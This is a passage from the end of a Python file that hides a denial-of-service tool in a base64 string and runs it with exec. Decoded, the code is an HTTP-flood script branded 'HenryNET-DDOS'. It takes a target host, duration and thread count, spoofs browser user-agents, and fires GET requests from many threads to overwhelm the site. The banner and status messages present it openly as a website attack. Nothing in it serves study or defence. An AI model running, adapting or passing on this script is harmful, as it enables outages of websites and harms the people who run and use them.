96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTEuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0NC4wLjAuMCBTYWZhcmkvNTM3LjM2JywNCiAgICAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTEuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0NS4wLjAuMCBTYWZhcmkvNTM3LjM2JywNCiAgICAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTEuMDsgV2luNjQ7IHg2NDsgcnY6MTA3LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA3LjAnLA0KICAgICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMS4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQ2LjAuMC4wIFNhZmFyaS81MzcuMzYnLA0KICAgICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMS4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQ3LjAuMC4wIFNhZmFyaS81MzcuMzYnLA0KICAgICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMS4wOyBXaW42NDsgeDY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMCcsDQogICAgJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDExLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDguMC4wLjAgU2FmYXJpLzUzNy4zNicsDQogICAgJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDExLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDkuMC4wLjAgU2FmYXJpLzUzNy4zNicsDQpdDQoNCmRlZiB1cGRhdGVfdGl0bGUocHBzLCByZXF1ZXN0c19wZXJfc2Vjb25kcyk6DQogICAgdGl0bGUgPSBmIkhUVFAtUkVRVUVTVFMgfCBIZW5yeU5FVCBBdHRhY2sgU2VudCB8IFBQUzoge3Bwc30gfCBSUVM6IHtyZXF1ZXN0c19wZXJfc2Vjb25kc30iDQogICAgaWYgb3MubmFtZSA9PSAnbnQnOg0KICAgICAgICBvcy5zeXN0ZW0oZid0aXRsZSB7dGl0bGV9JykNCg0KZGVmIHNlbmRfcmVxdWVzdCh1cmwpOg0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICdVc2VyLUFnZW50JzogcmFuZG9tLmNob2ljZShVU0VSX0FHRU5UUykNCiAgICB9DQogICAgdHJ5Og0KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgc3RhdHVzID0gcmVzcG9uc2Uuc3RhdHVzX2NvZGUNCiAgICAgICAgaWYgc3RhdHVzID09IDIwMDoNCiAgICAgICAgICAgIHByaW50KGYiSFRUUC1SRVFVRVNUUyB8IEhlbnJ5TkVUIEF0dGFjayBTZW50IHwgU3RhdHVzOiAyMDAiKQ0KICAgICAgICBlbGlmIHN0YXR1cyA9PSA1MDA6DQogICAgICAgICAgICBwcmludChmIkhUVFAtUkVRVUVTVFMgfCBIZW5yeU5FVCBBdHRhY2sgU2VudCB8IFN0YXR1czogNTAwIEVSUk9SIFdFQlNJVEUgU0VSVkVSIElTIERPV04iKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoZiJIZW5yeU5FVC1BVFRBQ0sgfCBIVUxLIFZlcnNpb24gNC41IHwgU3RhdHVzOiB7c3RhdHVzfSIpDQogICAgZXhjZXB0IHJlcXVlc3RzLlJlcXVlc3RFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcHJpbnQoZiJIVFRQLVJFUVVFU1RTIHwgSGVucnlORVQgQXR0YWNrIFNlbnQgfCBTdGF0dXM6IDUwMCBFUlJPUiBXRUJTSVRFIFNFUlZFUiBJUyBET1dOIikNCg0KZGVmIHdvcmtlcih1cmwsIGR1cmF0aW9uLCByZXF1ZXN0c19wZXJfbWlsbGkpOg0KICAgIGVuZF90aW1lID0gdGltZS50aW1lKCkgKyBkdXJhdGlvbg0KICAgIHdoaWxlIHRpbWUudGltZSgpIDwgZW5kX3RpbWU6DQogICAgICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQ0KICAgICAgICBmb3IgXyBpbiByYW5nZShyZXF1ZXN0c19wZXJfbWlsbGkpOg0KICAgICAgICAgICAgc2VuZF9yZXF1ZXN0KHVybCkNCiAgICAgICAgZWxhcHNlZF90aW1lID0gdGltZS50aW1lKCkgLSBzdGFydF90aW1lDQogICAgICAgIHBwcyA9IHJlcXVlc3RzX3Blcl9taWxsaSAvIGVsYXBzZWRfdGltZQ0KICAgICAgICB1cGRhdGVfdGl0bGUoaW50KHBwcyksIHJlcXVlc3RzX3Blcl9taWxsaSkNCg0KZGVmIG1haW4oKToNCiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykNCiAgICBwcmludCgiIiINCiAgIF9fXyAgX19fICBfX19fICBfX19fICAgIF9fXyBfX19fX19fX19fX19fX18gIF9fX19fX18gX18NCiAgLyBfIFwvIF8gXC8gX18gXC8gX18vICAgLyBfIC9fICBfXy9fICBfXy8gXyB8LyBfX18vIC8vXy8NCiAvIC8vIC8gLy8gLyAvXy8gL1wgXCAgICAvIF9fIHwvIC8gICAvIC8gLyBfXyAvIC9fXy8gLDwgICANCi9fX19fL19fX18vXF9fX18vX19fLyAgIC9fLyB8Xy9fLyAgIC9fLyAvXy8gfF9cX19fL18vfF98ICANCg0KV0VCU0lURSBBVFRBQ0tTIENMT0dHSU5HIEJSSURHRQ0KRElTVFJJQlVURUQgREVOSUFMIE9GIFNFUlZJQ0UgfCBCWSBIRU5SWU5FVC1ERE9TDQoNCiIiIikNCiAgICB1cmwgPSBpbnB1dCgiRW50ZXIgSG9zdDogIikuc3RyaXAoKQ0KICAgIGR1cmF0aW9uID0gaW50KGlucHV0KCJFbnRlciBUaW1lOiAiKS5zdHJpcCgpKQ0KICAgIHRocmVhZHNfY291bnQgPSBpbnQoaW5wdXQoIkVudGVyIFRocmVhZDogIikuc3RyaXAoKSkNCg0KICAgIHJlcXVlc3RzX3Blcl9taWxsaSA9IDk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5DQoNCiAgICB0aHJlYWRzID0gW10NCiAgICBmb3IgXyBpbiByYW5nZSh0aHJlYWRzX2NvdW50KToNCiAgICAgICAgdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9d29ya2VyLCBhcmdzPSh1cmwsIGR1cmF0aW9uLCByZXF1ZXN0c19wZXJfbWlsbGkpKQ0KICAgICAgICB0aHJlYWRzLmFwcGVuZCh0aHJlYWQpDQogICAgICAgIHRocmVhZC5zdGFydCgpDQoNCiAgICBmb3IgdGhyZWFkIGluIHRocmVhZHM6DQogICAgICAgIHRocmVhZC5qb2luKCkNCg0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCiAgICBtYWluKCkNCg=='
exec(base64.b64decode(python_code.encode('utf-8')).decode('utf-8'))
